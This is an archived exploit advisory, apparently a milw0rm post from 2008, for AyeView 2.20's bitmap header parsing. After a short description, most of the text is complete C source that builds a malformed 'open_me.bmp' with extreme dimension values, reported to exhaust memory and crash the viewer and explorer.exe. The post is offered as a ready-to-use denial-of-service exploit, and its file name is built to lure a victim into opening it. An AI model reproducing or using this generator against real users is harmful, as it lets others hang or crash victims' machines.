<html><head><title>AyeView 2.20 (invalid bitmap header parsing) Crash Exploit</title></head><pre>Name      : AyeView v2.20 (invalid bitmap header parsing) DoS Exploit
Credit    : suN8Hclf (DaRk-CodeRs Group), crimson.loyd@gmail.com
Download: : http://www.ayeview.com/downloads.htm
Greetz    : Luigi Auriemma, 0in, cOndemned, e.wiZz!, Gynvael Coldwind, 
            Katharsis, str0ke, all from #dark-coders and others;]

Short Desc:
AyeView v2.20 software does not properly parse values in bmp file header.
In fact it does it good but it does not check if these values are &quot;reasonable&quot;.
Therefore we can create a special bitmap, that will slow down or even
suspend the entire system. I have written a PoC that enforce AyeView
to allocate large amounts of memory. Short history:

First start of exploit      -&gt;  the system really slowed down
Second start(another values)-&gt;  I got a message that &quot;the amount of virtual memory
                                is too low&quot;, explorer.exe crashed
Third start(another values) -&gt;  AyeView crashed

PoC:
------------------------------exploit---------------------------
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;windows.h&gt;

struct bmpfile_header{
    short bfType;
    int bfSize;
    int Res;
    int bfOffBits;
    int biSize;
    int biWidth;
    int biHeight;
    short biPlanes;
    short biBitCount;
    int biCompression;
    int biSizeImage;
    int biXPelsPerMeter;
    int biYPelsPerMeter;
    int biClrUsed;
    char biClrImportant;
    char biClrRotation;
    short biReserved;
}__attribute__((packed)); //shift to 54 bytes


#define WIDTH 3000       //play around with these values...
#define HEIGHT 60000
#define Y 44432
#define X 54444

int main(int argc, char *argv[])
{
	struct bmpfile_header *bmpheader;
	char *memory;
	FILE *f;
	
	memory=(char *)malloc(60);
	if(memory==NULL){
		perror(&quot;malloc&quot;);
		return -1;
	}
	memset(memory, 0, 60);
	bmpheader=(struct bmpfile_header *)memory;
	printf(&quot;[+]Building bitmap... :)\n&quot;);
	bmpheader-&gt;bfType=*(short *)&quot;BM&quot;;
	bmpheader-&gt;bfSize=(int)60;
	bmpheader-&gt;Res=0;
	bmpheader-&gt;bfOffBits=54;
	bmpheader-&gt;biSize=40;
	bmpheader-&gt;biHeight=(int)HEIGHT;
	bmpheader-&gt;biWidth=(int)WIDTH;
	bmpheader-&gt;biPlanes=1;
	bmpheader-&gt;biBitCount=24;
	bmpheader-&gt;biCompression=0;
	bmpheader-&gt;biSizeImage=6;
	bmpheader-&gt;biXPelsPerMeter=(int)X;
	bmpheader-&gt;biYPelsPerMeter=(int)Y;
	bmpheader-&gt;biClrUsed=255*255*255;
	bmpheader-&gt;biClrImportant=0;
	bmpheader-&gt;biClrRotation=0;
	
	f=fopen(&quot;open_me.bmp&quot;, &quot;wb&quot;);
    	if(!f){
           perror(&quot;fopen&quot;);
           free(memory);
           exit(-1);
    	}
    	fwrite(memory, 1, 60, f);
    	fclose(f); 
	printf(&quot;[+]open_me.bmp bitmap created :)\n&quot;);
	free(memory);
	return 0;
}
------------------------------exploit---------------------------

Stay secure...

# milw0rm.com [2008-10-05]</pre></html>